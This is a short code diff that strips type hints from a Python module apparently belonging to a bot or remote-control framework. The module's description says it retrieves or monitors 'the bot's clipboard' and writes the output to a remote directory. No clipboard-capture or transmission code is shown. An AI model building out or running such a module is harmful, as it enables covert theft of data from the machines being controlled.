@@ -7,7 +7,7 @@ import os
 
 
 class Module(ModuleABC):
-    def get_info(self) -> dict:
+    def get_info(self):
         return {
             "Author:": ["Marten4n6"],
             "Description": "Retrieve or monitor the bot's clipboard.",
@@ -15,13 +15,13 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def get_setup_messages(self) -> List[str]:
+    def get_setup_messages(self):
         return [
             "Time in seconds to monitor the clipboard (Leave empty for 0): ",
             "Remote output directory (Leave empty to not output to a file): "
         ]
 
-    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+    def setup(self, set_options):
         monitor_time = set_options[0]
 
         if not monitor_time:
